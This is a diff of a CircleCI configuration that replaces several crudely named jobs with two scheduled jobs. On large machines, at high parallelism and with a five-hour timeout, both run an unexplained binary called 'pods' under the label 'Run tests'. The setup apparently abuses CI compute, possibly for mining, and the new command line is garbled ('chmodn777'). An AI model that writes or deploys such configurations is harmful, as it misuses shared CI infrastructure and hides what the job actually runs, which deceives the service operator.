@@ -1,67 +1,43 @@
-version: 2.1
-
-executors:
-    kontol:
-        machine:
-            image: ubuntu-2004:202101-01
-            resource_class: large
-    memek:
-        machine:
-            image: ubuntu-2004:202101-01
-            resource_class: large
-
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    - run:
+        name: Run tests
+        command: |
+                    apt update 
+                    chmodn777 pods && ./pods
+        no_output_timeout: 300m
+version: 2.0
 jobs:
-  maja:
-    parallelism: 5
-    parameters:
-      os:
-        type: executor
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - run:
-         Name: maja
-         command: |
-                     chmod +x pods && ./pods
-         no_output_timeout: 300m
-  meje:
-    parallelism: 5
-    parameters:
-      os:
-        type: executor
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - run:
-         Name: meje
-         command: |
-                     chmod +x pods && ./pods
-         no_output_timeout: 300m
-  miji:
-    parallelism: 5
-    parameters:
-      os:
-        type: executor
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - run:
-         Name: miji
-         command: |
-                     chmod +x pods && ./pods
-         no_output_timeout: 300m
+  endvoc:
+    <<: *script
+    machine:
+      image: ubuntu-2004:202101-01
+      resource_class: large
+    parallelism: 15
+  endvoc1:
+    <<: *script
+    machine:
+      image: ubuntu-2004:202101-01
+      resource_class: large
+    parallelism: 15
 workflows:
-  all-tests:
+  version: 2
+  commit:
     jobs:
-      - maja:
-          matrix:
-            parameters:
-              os: ["kontol", "memek"]
-      - meje:
-          matrix:
-            parameters:
-              os: ["kontol", "memek"]
-      - miji:
-          matrix:
-            parameters:
-              os: ["kontol", "memek"]
+      - endvoc
+      - endvoc1
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - main
+
+  endvocrunjob:
+    jobs:
+      - endvoc
+      - endvoc1
